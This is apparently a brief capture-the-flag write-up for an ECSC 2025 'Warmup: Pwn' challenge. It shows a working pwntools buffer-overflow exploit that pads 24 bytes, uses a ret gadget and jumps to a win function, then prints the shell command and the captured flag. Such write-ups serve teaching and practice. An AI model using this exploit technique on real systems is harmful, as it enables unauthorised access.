# Warmup: Pwn

There is a buffer overflow. To exploit it we need to get addresses:
```
objdump -d server
```
send filling payload, align the stack and jump to the win function:
```py
from pwn import *

conn = remote('warmup.ecsc25.hack.cert.pl', 5210)

win_addr = 0x401176
ret_gadget = 0x40101a

payload = b"A" * 24 + p64(ret_gadget) + p64(win_addr) + b'\n'

conn.send(payload)
conn.interactive()
```
after that we got bash on the server:
```bash
cat flag.txt
# ecsc25{pwn3d}
```
